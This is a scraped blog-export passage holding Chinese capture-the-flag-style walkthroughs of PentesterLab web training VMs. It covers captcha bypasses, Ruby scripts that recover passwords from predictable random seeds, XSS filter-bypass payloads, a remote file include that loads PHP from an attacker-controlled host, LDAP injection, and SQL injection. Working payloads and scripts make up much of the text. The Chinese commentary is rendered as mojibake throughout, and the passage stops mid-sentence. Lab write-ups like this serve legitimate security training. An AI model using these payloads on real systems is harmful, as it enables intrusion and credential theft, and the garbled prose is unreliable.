text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://172.16.71.149/captcha/example2/ Connection: close Cookie: rack.session=525baf022ef804ebce727262500c3074f121064d31acccf75fc07532bf37e54d Upgrade-Insecure-Requests: 1 Example 3 åœ¨ cookie ä¸­å¯ä»¥çœ‹åˆ°\nGET /captcha/example3/submit?captcha=1\u0026amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 HTTP/1.1 Host: 172.16.71.149 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://172.16.71.149/captcha/example3/ Connection: close Cookie: captcha=C%5DjhO%5DEL%5B%5B; rack.session=525baf022ef804ebce727262500c3074f121064d31acccf75fc07532bf37e54d Upgrade-Insecure-Requests: 1 Example 4 è¿™é‡Œæ¯”è¾ƒç®€å•å°±å¯ä»¥çœ‹å‡ºéªŒè¯ç äº†ï¼Œçœ‹å‡ºæ¥ç›´æ¥è¾“å…¥å°±è¡Œäº†ã€‚ä½†æ˜¯å®˜æ–¹ç»™çš„æ˜¯å› ä¸º session ä¸å˜ï¼ŒéªŒè¯ç å°±ä¸å˜ï¼Œå¯ä»¥çˆ†ç ´\u0026hellip;æ„Ÿè§‰æ²¡é‚£ä¸ªå¿…è¦\nExample 5 è¿™é‡Œå°±æ˜¯å‡ ä¸ªéªŒè¯ç ï¼Œè€Œä¸”éƒ½æ˜¯å½¢æˆäº†å•è¯ï¼Œæ¯”å¦‚ hacker/securtiy ç­‰ï¼Œå®˜æ–¹ç»™çš„æ˜¯å¼„ä¸€ä¸ªå­—å…¸çˆ†ç ´\nExample 6  \nè¿™é‡Œæ˜¯å¯ä»¥ç›´æ¥è¯†åˆ«å¾—å‡ºæ¥çš„ï¼Œå­—ä½“å¹¶æ²¡æœ‰ç»è¿‡ä»»ä½•å˜æ¢ã€‚\nExample 7  \nè¿™é‡Œåªæ˜¯åŠ äº†è“è‰²çš„æ¡çº¹ï¼Œå®˜æ–¹ç»™å‡ºäº†å»é™¤æ¡çº¹çš„è„šæœ¬\nrequire \u0026#39;RMagick\u0026#39; image = Magick::Image.read(\u0026#34;current7.png\u0026#34;).first image = image.threshold(THRESHOLD) image.write(\u0026#34;current7.png\u0026#34;) Example 8  \nè¿™é‡Œæ˜¯ 7 çš„è¿›åŒ–ï¼Œè¿›è¡Œäº†ä¸€ç‚¹æ‰­æ›²\nrequire \u0026#39;RMagick\u0026#39; image = Magick::Image.read(\u0026#34;current8.png\u0026#34;).first image = image.implode(IMPLODE) image = image.threshold(THRESHOLD) image.write(\u0026#34;current8.png\u0026#34;) Example 9  \nç®€å•è®¡ç®—ï¼Œpython æ­£åˆ™å–å‡ºæ¥ç›´æ¥evalå³å¯\nRandomness Issues Example 1  â€‹\tIn this exercise, you can log in with the following user: \u0026ldquo;hacker\u0026rdquo; with the password \u0026ldquo;hjtvse\u0026rdquo;. Your user is the second one that has been created for this application and you retrieved the following source code:\ns = Random.new(0) pass = 6.times.map { (\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a[s.rand((\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a.size)]}.join User.create(:username =\u0026gt; \u0026#39;admin\u0026#39;, :password =\u0026gt; Digest::MD5.hexdigest(SEED+pass+SEED)) pass = 6.times.map { (\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a[s.rand((\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a.size)]}.join User.create(:username =\u0026gt; \u0026#39;hacker\u0026#39;, :password =\u0026gt; Digest::MD5.hexdigest(SEED+pass+SEED))  ç”¨ ruby æœ¬åœ°è·‘ä¸€ä¸‹å¯ä»¥å‘ç°è²Œä¼¼äº§ç”Ÿçš„éšæœºæ˜¯å›ºå®šçš„\ns = Random.new(0) pass = 6.times.map { (\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a[s.rand((\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a.size)]}.join puts pass #mpvadd å¯†ç å°±æ˜¯mpvadd\nExample 2  In this exercise, you can log in with the following user: \u0026ldquo;hacker\u0026rdquo; with the password \u0026ldquo;afxabo\u0026rdquo;. Your user is the second one that has been created for this application and you retrieved the following source code:\ns = Random.new(Time.now.to_i) pass = 6.times.map { (\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a[s.rand((\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a.size)]}.join User.create(:username =\u0026gt; \u0026#39;admin\u0026#39;, :password =\u0026gt; Digest::MD5.hexdigest(SEED+pass+SEED)) pass = 6.times.map { (\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a[s.rand((\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a.size)]}.join User.create(:username =\u0026gt; \u0026#39;hacker\u0026#39;, :password =\u0026gt; Digest::MD5.hexdigest(SEED+pass+SEED))  è™½ç„¶è¿™æ¬¡ç”¨çš„æ˜¯æ—¶é—´æ•°ç§å­ï¼Œä½†æ˜¯æˆ‘ä»¬ä»ç„¶å¯ä»¥çˆ†ç ´å‡ºæ¥ï¼Œè´´ä¸€ä¸ªå…¶ä»–å¸ˆå‚…çš„è„šæœ¬\ntimestamp = (Time.now.to_f).to_i seed = Random.new(timestamp) pass_admin = 6.times.map { (\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a[seed.rand((\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a.size)]}.join pass_hacker = 6.times.map { (\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a[seed.rand((\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a.size)]}.join while pass_hacker !=\u0026#34;afxabo\u0026#34; do timestamp = timestamp - 1 seed = Random.new(timestamp) pass_admin = 6.times.map { (\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a[seed.rand((\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a.size)]}.join pass_hacker = 6.times.map { (\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a[seed.rand((\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a.size)]}.join end puts \u0026#34;Password of admin: \u0026#34; puts pass_admin #vqcpux å¾—åˆ° admin å¯†ç \nExample 3  In this exercise, you can log in with the following user: \u0026ldquo;hacker\u0026rdquo; with the password \u0026ldquo;xgyymbghxo\u0026quot;.Your user is the second one that has been created for this application and you retrieved the following source code:\ns = Random.new(0) pass = (6+s.rand(5)).times.map { (\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a[s.rand((\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a.size)]}.join User.create(:username =\u0026gt; \u0026#39;admin\u0026#39;, :password =\u0026gt; Digest::MD5.hexdigest(SEED+pass+SEED)) pass = (6+s.rand(5)).times.map { (\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a[s.rand((\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a.size)]}.join User.create(:username =\u0026gt; \u0026#39;hacker\u0026#39;, :password =\u0026gt; Digest::MD5.hexdigest(SEED+pass+SEED))  ç”±äºè¿˜æ˜¯ç”¨ 0 åšçš„ç§å­ï¼Œæ‰€ä»¥æˆ‘ä»¬ä»ç„¶å¯ä»¥é‡æ”¾ç™»å½•å¯†ç \ns = Random.new(0) pass = (6+s.rand(5)).times.map { (\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a[s.rand((\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a.size)]}.join puts pass #pvaddhjtvs Example 4  In this exercise, you can log in with the following user: \u0026ldquo;hacker\u0026rdquo; with the password \u0026ldquo;wtpwnl\u0026rdquo;. Your user is the second one that has been created for this application and you retrieved the following source code:\ns = Random.new(0) rand(1000).times {s.rand(5)} pass = 6.times.map { (\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a[s.rand((\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a.size)]}.join User.create(:username =\u0026gt; \u0026#39;admin\u0026#39;, :password =\u0026gt; Digest::MD5.hexdigest(SEED+pass+SEED)) pass = 6.times.map { (\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a[s.rand((\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a.size)]}.join User.create(:username =\u0026gt; \u0026#39;hacker\u0026#39;, :password =\u0026gt; Digest::MD5.hexdigest(SEED+pass+SEED))  è™½ç„¶ç”¨rand(1000)æ¥ç”¨éšæœºç§å­ï¼Œä½†æ˜¯ä¾ç„¶å¯ä»¥çˆ†ç ´ï¼Œç»™ä¸€ä¸ªå…¶ä»–å¸ˆå‚…çš„è„šæœ¬ï¼š\nn = 1000 seed = Random.new(0) n.times {seed.rand(5)} pass_admin = 6.times.map { (\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a[seed.rand((\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a.size)]}.join pass_hacker = 6.times.map { (\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a[seed.rand((\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a.size)]}.join while pass_hacker !=\u0026#34;wtpwnl\u0026#34; do n = n - 1 seed = Random.new(0) n.times {seed.rand(5)} pass_admin = 6.times.map { (\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a[seed.rand((\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a.size)]}.join pass_hacker = 6.times.map { (\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a[seed.rand((\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;).to_a.size)]}.join end puts \u0026#34;Password de admin: \u0026#34; puts pass_admin Conclusion æ•´ä½“è™½ç„¶åç®€å•ï¼Œä½†æ˜¯åšå®Œæ”¶è·è¿˜æ˜¯æ¯”è¾ƒå¤§çš„ï¼Œä¹Ÿè¡¥å……äº†ä¸€ç‚¹çŸ¥è¯†ï¼Œå¯¹äº ruby è¿™é‡Œçš„å­¦ä¹ ç”±äºæœ€è¿‘æ—¶é—´æ¯”è¾ƒç´§ï¼Œå°±ç›´æ¥ç”¨çš„æ˜¯å…¶ä»–å¸ˆå‚…çš„è„šæœ¬äº†ï¼Œå¯¹äº sql ç›²æ³¨è¿˜æ˜¯éœ€è¦è¡¥å……ä¸€äº›çŸ¥è¯†çš„ï¼Œè¿˜æœ‰ä¸€äº›åŸç†éœ€è¦æ›´æ·±å…¥ä¸€äº›ã€‚è¿˜æœ‰ä¸€äº›è®¤è¯ç»•è¿‡ï¼Œå¯¹äºæŒ–æ´è¿˜æ˜¯æ¯”è¾ƒæœ‰å¯å‘æ€§çš„ã€‚\n","date":"2019-03-10T23:51:31Z","permalink":"https://blog.zeddyu.info/2019/03/10/Web-For-Pentest-II/","title":"Web For Pentest II"},{"content":"å¾ˆä¹…ä¹‹å‰å°±æƒ³åšçš„é¶æœºï¼Œä¸€ç›´æ²¡åšï¼Œæœ€è¿‘æœ‰ç©ºæ¸…ç†ä¸€ä¸‹ã€‚åœ°å€åœ¨PentestLab\n[TOC]\nPre ä¸‹è½½å¾—åˆ°ä¸€ä¸ª iso åç›´æ¥ç”¨ vmware è£…èµ·æ¥ï¼Œifconfigå¾—åˆ° ip ï¼Œè®¿é—®å°±å¯ä»¥çœ‹åˆ°ä¸»é¡µäº†\n \nHacking XSS Example 1 http://172.16.71.152/xss/example1.php?name=hacker ä¸€ä¸ªå…¸å‹çš„åå°„å‹ xss ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° url ä¸­æœ‰ä¸ªnameçš„å‚æ•°ï¼Œç›´æ¥ x\nhttp://172.16.71.152/xss/example1.php?name=%3Cscript%3Ealert(1);%3C/script%3E Example 2 http://172.16.71.152/xss/example1.php?name=hacker è¿˜æ˜¯å°è¯•ç”¨\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;ç›´æ¥ x ï¼Œå‘ç°è¢«è¿‡æ»¤äº†\n\u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; Hello alert(1) \u0026lt;footer\u0026gt; \u0026lt;p\u0026gt;\u0026amp;copy; PentesterLab 2013\u0026lt;/p\u0026gt; \u0026lt;/footer\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- /container --\u0026gt; å¤§å°å†™ç»•è¿‡\nhttp://172.16.71.152/xss/example2.php?name=%3CScript%3Ealert(1)%3C/Script%3E Example 3 http://172.16.71.152/xss/example3.php?name=hacker å¤§å°å†™ä¹Ÿè¢«è¿‡æ»¤äº†ï¼ŒåŒå†™çš„è¯ç«Ÿç„¶æ²¡æœ‰è¢«æ›¿ä»£\u0026lt;scscriptript\u0026gt;ï¼Œç›´æ¥åŸæ ·è¿”å›äº†ï¼Œæ¢æˆå…¶ä»–æ ‡ç­¾\nhttp://172.16.71.152/xss/example3.php?name=%3Cbody/onload=alert(1)%3E æŸ¥çœ‹äº†æºä»£ç ï¼ŒåŸæ¥æ˜¯æŠŠ\u0026lt;script\u0026gt;ä¸\u0026lt;/script\u0026gt;éƒ½æ›¿æ¢äº†ï¼ŒæŠŠå°–æ‹¬å·ä¹Ÿæ›¿ä»£äº†\u0026hellip;ä¹Ÿæ˜¯è‡ªå·±ä¸å¤Ÿä»”ç»†â€¦ç¡®å®åº”è¯¥æƒ³åˆ°æ›¿æ¢åŒ…å«äº†å°–æ‹¬å·çš„é—®é¢˜\nhttp://172.16.71.152/xss/example3.php?name=%3CSc%3CScript%3Eript%3Ealert(1)%3C/Sc%3C/Script%3Eript%3E Example 4 http://172.16.71.152/xss/example4.php?name=hacker ä½¿ç”¨\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;ï¼Œå‘ç°ç›´æ¥å›æ˜¾äº†errorï¼Œå¹¶æ²¡æœ‰å…¶ä»–çš„æç¤ºäº†ï¼Œæˆ‘ä»¬ä»æ—§å¯ä»¥ä½¿ç”¨\u0026lt;body/onload=alert(1)\u0026gt;\næºä»£ç æ˜¯\nif(preg_match(\u0026#39;/script/i\u0026#39;,$_GET[\u0026#39;name\u0026#39;])){ die(\u0026#39;error\u0026#39;); } ç¦æ­¢ä½¿ç”¨äº†scriptå…³é”®å­—\nExample 5 http://172.16.71.152/xss/example5.php?name=hacker fuzz å‘ç°æ˜¯alertç›´æ¥å°±è¿”å›erroräº†ï¼Œä¸ç”¨alertï¼Œæˆ‘ä»¬è¿˜æœ‰prompt\nhttp://172.16.71.152/xss/example5.php?name=%3Cbody/onload=prompt(1)%3E æºä»£ç æ˜¯ï¼š\nif(preg_match(\u0026#39;/alert/i\u0026#39;,$_GET[\u0026#39;name\u0026#39;])){ die(\u0026#39;error\u0026#39;); } è¿™\u0026hellip;æ„Ÿè§‰æœ‰ç‚¹æ— è¯­ï¼Œè®²é“ç†æˆ‘è¿˜ä»¥ä¸ºåº”è¯¥æ˜¯scriptä¸alertä¸€èµ·è¿‡æ»¤äº†\u0026hellip;\nExample 6 http://172.16.71.152/xss/example6.php?name=hacker ç”¨\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;æµ‹è¯•ï¼Œå‘ç°è¾“å…¥å˜æˆäº†\nHello \u0026lt;script\u0026gt; var $a= \u0026#34;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026#34;; \u0026lt;/script\u0026gt; æ„æ€å°±æ˜¯æŠŠè¾“å…¥ç»™æ”¾åœ¨äº†var $a= \u0026quot;â€¦\u0026quot;å½“ä¸­ï¼Œé—­åˆåŒå¼•å·ï¼Œæ³¨é‡Šåé¢å³å¯\nhttp://172.16.71.152/xss/example6.php?name=%22;alert(1)// Example 7 http://172.16.71.152/xss/example7.php?name=hacker ç”¨\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;æµ‹è¯•ï¼Œå‘ç°è¾“å…¥å˜æˆäº†\nHello \u0026lt;script\u0026gt; var $a= \u0026#39;\u0026amp;lt;script\u0026amp;gt;alert(1)\u0026amp;lt;/script\u0026amp;gt;\u0026#39;; \u0026lt;/script\u0026gt; ä¾ç„¶å¯ä»¥é—­åˆå•å¼•å·ï¼Œæ³¨é‡Šåé¢å³å¯ã€‚\nhttp://172.16.71.152/xss/example7.php?name=%27;alert(1)// Example 8 å‘ç°è¿™å…³æœ‰ä¸ªè¾“å…¥æ¡†ï¼Œæäº¤\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;ï¼Œå‘ç°è¿”å›äº†å®ä½“ç¼–ç \nHELLO \u0026amp;lt;script\u0026amp;gt;alert(1)\u0026amp;lt;/script\u0026amp;gt;\u0026lt;form action=\u0026#34;/xss/example8.php\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; Your name:\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;name\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; name=\u0026#34;submit\u0026#34;/\u0026gt; å°è¯•äº†ä¸€äº›ç‰¹æ®Šå­—ç¬¦\n()/'\u0026quot;;\u0026lt;\u0026gt;` HELLO ()/'\u0026amp;quot;;\u0026amp;lt;\u0026amp;gt;` å‘ç°\u0026lt;\u0026gt;è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯è¾“å‡ºç»“æœåˆæ²¡æœ‰å¤„äºä»»ä½•ä¸€ä¸ªæ ‡ç­¾çš„å±æ€§ä¹‹å†…ï¼Œæ„Ÿè§‰æ²¡æœ‰ä»€ä¹ˆæ”»å‡»ç‚¹ï¼ŒæŸ¥çœ‹æºä»£ç \nif(isset($_POST[\u0026#39;name\u0026#39;])){ echo \u0026#34;HELLO \u0026#34;.htmlentities($_POST[\u0026#39;name\u0026#39;]); } ç¡®å®ç”¨äº†htmlentitiesï¼Œä½†æ˜¯æ„Ÿè§‰åœ¨è¾“å‡ºåˆå¤„åœ¨å†…å®¹å½“ä¸­ï¼ŒçœŸçš„æ²¡ä»€ä¹ˆåˆ©ç”¨çš„ç‚¹ï¼Œæ‰¾äº†ä¸€æ³¢ä¹Ÿæ²¡å‘ç°ä»€ä¹ˆæœ‰ç”¨çš„åˆ©ç”¨å§¿åŠ¿ï¼Œæœ€åçœ‹æ–‡æ¡£ï¼Œæ‰çŸ¥é“æ”»å‡»ç‚¹å¹¶ä¸åœ¨è¿™ï¼Œè€Œæ˜¯åœ¨åé¢çš„ä»£ç ä¸­\n\u0026lt;form action=\u0026quot;\u0026lt;?php echo $_SERVER['PHP_SELF']; ?\u0026gt;\u0026quot; method=\u0026quot;POST\u0026quot;\u0026gt; Your name:\u0026lt;input type=\u0026quot;text\u0026quot; name=\u0026quot;name\u0026quot; /\u0026gt; \u0026lt;input type=\u0026quot;submit\u0026quot; name=\u0026quot;submit\u0026quot;/\u0026gt; é—®é¢˜å°±å‡ºç°åœ¨\u0026lt;?php echo $_SERVER['PHP_SELF']; ?\u0026gt;è¿™é‡Œ\n â€‹\t\u0026lsquo;PHP_SELF\u0026rsquo;\nå½“å‰æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶åï¼Œä¸ document root æœ‰å…³ã€‚ä¾‹å¦‚ï¼Œåœ¨åœ°å€ä¸º http://example.com/foo/bar.php çš„è„šæœ¬ä¸­ä½¿ç”¨ $_SERVER[\u0026lsquo;PHP_SELF\u0026rsquo;] å°†å¾—åˆ° /foo/bar.phpã€‚FILE å¸¸é‡åŒ…å«å½“å‰(ä¾‹å¦‚åŒ…å«)æ–‡ä»¶çš„å®Œæ•´è·¯å¾„å’Œæ–‡ä»¶åã€‚ ä» PHP 4.3.0 ç‰ˆæœ¬å¼€å§‹ï¼Œå¦‚æœ PHP ä»¥å‘½ä»¤è¡Œæ¨¡å¼è¿è¡Œï¼Œè¿™ä¸ªå˜é‡å°†åŒ…å«è„šæœ¬åã€‚ä¹‹å‰çš„ç‰ˆæœ¬è¯¥å˜é‡ä¸å¯ç”¨ã€‚\n æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œæ˜¯è·å–æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶åï¼Œæˆ‘ä»¬å¯ä»¥æœ‰xss/example8.php/%3Cï¼Œè¿”å›\n\u0026lt;form action=\u0026#34;/xss/example8.php/\u0026lt;\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; è¯´æ˜PHP_SELFæ˜¯å¯æ§çš„ï¼Œè€Œä¸”åˆå­˜åœ¨åœ¨actionå±æ€§ä¸­ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥æœ‰ï¼Œç›´æ¥é—­åˆformï¼Œç„¶åç›´æ¥ x\n\u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;// Example 9 http://172.16.71.152/xss/example9.php#hacker å‘ç°é¡µé¢æœ‰\n\u0026lt;script\u0026gt; document.write(location.hash.substring(1)); \u0026lt;/script\u0026gt; ä¸€ä¸ª DOM å‹çš„ XSS ï¼Œè®²é“ç†åº”è¯¥å¯ä»¥ç›´æ¥ä½¿ç”¨#\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;æ¥è¿›è¡Œ xss ï¼Œä½†æ˜¯\u0026hellip;ä¸çŸ¥é“æ˜¯ä¸æ˜¯æµè§ˆå™¨çš„é—®é¢˜ï¼Œç›´æ¥å°±ç»™æˆ‘æŠŠ\u0026lt;\u0026gt;è¿›è¡Œ url ç¼–ç äº†\u0026hellip;\nFile Include Example 1 ç›´æ¥ç”¨\nphp://filter/read=convert.base64-encode/resource=intro.php php://filter/read=convert.base64-encode/resource=example1.php å¾—åˆ°æºç \n\u0026lt;?php require_once \u0026#39;../header.php\u0026#39;; ?\u0026gt;\u0026lt;?php if ($_GET[\u0026#34;page\u0026#34;]) { include($_GET[\u0026#34;page\u0026#34;]); } ?\u0026gt; \u0026lt;?php require_once \u0026#39;../footer.php\u0026#39;; ?\u0026gt; ä½†æ˜¯å®˜æ–¹çš„æ„æ€æ˜¯è®©æˆ‘ä»¬ä½“éªŒä¸€ä¸‹è¿œç¨‹åŒ…å«çš„æ„Ÿè§‰\u0026hellip;\nhttp://172.16.71.152/fileincl/example1.php?page=http://your_ip/zedd.txt Zedd.txt ä¸­çš„å†…å®¹ä¸º\n\u0026lt;?php phpinfo(); å¾—åˆ°\n \nExample 2 æ¯”ä¸Šé¢å°‘ä¸ªåç¼€\nphp://filter/read=convert.base64-encode/resource=intro php://filter/read=convert.base64-encode/resource=example2 è¯»å–æºä»£ç \n\u0026lt;?php require_once \u0026#39;../header.php\u0026#39;; ?\u0026gt;\u0026lt;?php if ($_GET[\u0026#34;page\u0026#34;]) { $file = $_GET[\u0026#34;page\u0026#34;].\u0026#34;.php\u0026#34;; // simulate null byte issue $file = preg_replace(\u0026#39;/\\x00.*/\u0026#39;,\u0026#34;\u0026#34;,$file); include($file); } ?\u0026gt; \u0026lt;?php require_once \u0026#39;../footer.php\u0026#39;; ?\u0026gt; æˆ‘ä»¬å¯ä»¥åˆ©ç”¨zedd.txt%00æ¥ç»•è¿‡\nLDAP attacks Example 1 ç€å®æ²¡çœ‹æ‡‚è¿™ä¸ª Example æ˜¯ä»€ä¹ˆé¬¼\u0026hellip;\n â€‹\tIn this first example, you connect to a LDAP server, using your username and password. In this instance, The LDAP server does not authenticate you, since your credentials are invalid.\nHowever, some LDAP servers authorise NULL Bind: if null values are sent, the LDAP server will proceed to bind the connection, and the PHP code will think that the credentials are correct. To get the bind with 2 null values, you will need to completely remove this parameter from the query. If you keep something like username=\u0026amp;password= in the URL, these values will not work, since they won\u0026rsquo;t be null; instead, they will be empty.\n èœæ˜¯è¶Šæ¥è¶Šèœï¼Œæ•´ä¸ªæ„æ€å°±æ˜¯è¯´å¯ä»¥ç”¨ç©ºå€¼ç»•è¿‡ï¼Œå°±æ˜¯ç›´æ¥è®¿é—®http://172.16.71.152/ldap/example1.phpå³å¯\u0026hellip;\nExample 2 æŒ‰ç…§ Example 1 çš„å¥—è·¯ï¼Œå…ˆç›´æ¥è®¿é—®çœ‹çœ‹ï¼Œå‘ç°è¿”å›\nNotice: Undefined index: password in /var/www/ldap/example2.php on line 9 Notice: Undefined index: name in /var/www/ldap/example2.php on line 10 UNAUTHENTICATED çœ‹æ¥æ˜¯ä¸ªæ­£ç»çš„æ³¨å…¥é¢˜äº†ï¼Œ\n\u0026lt;?php require \u0026#34;../header.php\u0026#34; ; $ld = ldap_connect(\u0026#34;localhost\u0026#34;) or die(\u0026#34;Could not connect to LDAP server\u0026#34;); ldap_set_option($ld, LDAP_OPT_PROTOCOL_VERSION, 3); ldap_set_option($ld, LDAP_OPT_REFERRALS, 0); if ($ld) { $lb = @ldap_bind($ld, \u0026#34;cn=admin,dc=pentesterlab,dc=com\u0026#34;, \u0026#34;pentesterlab\u0026#34;); if ($lb) { $pass = \u0026#34;{MD5}\u0026#34;.base64_encode(pack(\u0026#34;H*\u0026#34;,md5($_GET[\u0026#39;password\u0026#39;]))); $filter = \u0026#34;(\u0026amp;(cn=\u0026#34;.$_GET[\u0026#39;name\u0026#39;].\u0026#34;)(userPassword=\u0026#34;.$pass.\u0026#34;))\u0026#34;; if (!($search=@ldap_search($ld, \u0026#34;ou=people,dc=pentesterlab,dc=com\u0026#34;, $filter))) { echo(\u0026#34;Unable to search ldap server\u0026lt;br\u0026gt;\u0026#34;); echo(\u0026#34;msg:\u0026#39;\u0026#34;.ldap_error($ld).\u0026#34;\u0026#39;\u0026lt;/br\u0026gt;\u0026#34;); } else { $number_returned = ldap_count_entries($ld,$search); $info = ldap_get_entries($ld, $search); if ($info[\u0026#34;count\u0026#34;] \u0026lt; 1) { //NOK  echo \u0026#34;UNAUTHENTICATED\u0026#34;; } else { echo \u0026#34;AUTHENTICATED as\u0026#34;; echo(\u0026#34; \u0026#34;.htmlentities($info[0][\u0026#39;uid\u0026#39;][0])); }\t} } } require \u0026#34;../footer.php\u0026#34; ; ?\u0026gt;æŠ˜è…¾äº†æŒºä¹…ï¼Œè¿™é‡Œç›´æ¥çœ‹æºç ï¼Œæˆ‘ä»¬å¯¹ç€åˆ†æï¼Œå› ä¸ºpasswordå¤„æ˜¯è¢«md5å¤„ç†äº†ï¼Œæ‰€ä»¥åé¢æˆ‘ä»¬æ²¡åŠæ³•æ³¨å…¥ï¼Œè¿™é‡Œä»–æ‰§è¡Œä¸¤æ¡ä»¥ä¸Šçš„è¯­å¥ä¼šç›´æ¥æŠ¥é”™Bad search filterï¼Œä¸èƒ½åƒç½‘ä¸Šç»™çš„å¤§å¤šæ•° payload ä¸€æ ·ç›´æ¥æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ†æä¸€ä¸‹ï¼Œå¯ä»¥åœ¨nameå¤„é—­åˆå‰é¢çš„æ‹¬å·ï¼Œå†ç”¨%00æˆªæ–­åé¢çš„å³å¯ï¼Œ\nadmin)(cn=admin))%00\u0026amp;password=hacker ä¹Ÿå¯ä»¥ä¸ç”¨åé¢é‚£ä¸ªcn=admin\nadmin))%00\u0026amp;password=hacker ä¸è¿‡æˆ‘çœ‹æ–‡æ¡£å†™çš„æœ‰ä¸€å¤„ fuzz è¿˜æ˜¯æ¯”è¾ƒå¥½çš„ï¼š\n  é¦–å…ˆå…ˆç”¨name=hacker\u0026amp;password=hackerï¼Œå›æ˜¾æ­£å¸¸ æ¥ç€ç”¨name=hack*\u0026amp;password=hackerï¼Œå›æ˜¾ä¹Ÿæ­£å¸¸ å°è¯•name=hacker\u0026amp;password=hack*ï¼Œä¸èƒ½è®¤è¯ å°è¯•name=hack*\u0026amp;password=hack*ï¼Œä¸èƒ½è®¤è¯  ä»è¿™é‡Œå¯ä»¥æ¨æ–­ï¼Œpasswordå¤„å¯èƒ½æ˜¯ç»è¿‡äº† Hash æˆ–è€…ä¸€äº›ä»€ä¹ˆæ“ä½œï¼Œæˆ‘ä»¬çš„æ³¨å…¥ç‚¹åªèƒ½åœ¨usernameå¤„\n SQL Injection Example 1 root' or 1=1%23 æ²¡å•¥å¥½è¯´çš„\nExample 2 å°è¯•root' or 1=1%23ï¼Œè¿”å›\nERROR NO SPACE ç›´æ¥ç”¨%0aç»•\nroot'%0Aor%0A1=1%23 Example 3 %0aè¿˜æ˜¯è¿”å›äº†\nERROR NO SPACE ç”¨%a0ç»•\nroot%27%A0or%A01=1%23 Example 4 http://172.16.71.152/sqli/example4.php?id=2 è¿™é‡Œå‚æ•°å˜æˆäº† id ï¼ŒçŒœæµ‹æ˜¯æ•´å½¢æ³¨å…¥\n2 or 1=1%23 Example 5 ä¾æ—§å¯ä»¥ä½¿ç”¨2 or 1=1%23æ³¨å…¥\nçœ‹äº†ä¸€ä¸‹ä»£ç \nif (!preg_match(\u0026#39;/^[0-9]+/\u0026#39;, $_GET[\u0026#34;id\u0026#34;])) { die(\u0026#34;ERROR INTEGER REQUIRED\u0026#34;);\t} $sql = \u0026#34;SELECT * FROM users where id=\u0026#34;; $sql .= $_GET[\u0026#34;id\u0026#34;] ; $result = mysql_query($sql); åªè¦å¼€å¤´æ˜¯æ•°å­—å°±å¯ä»¥ç»•è¿‡äº†\nExample 6 å°è¯•2 or 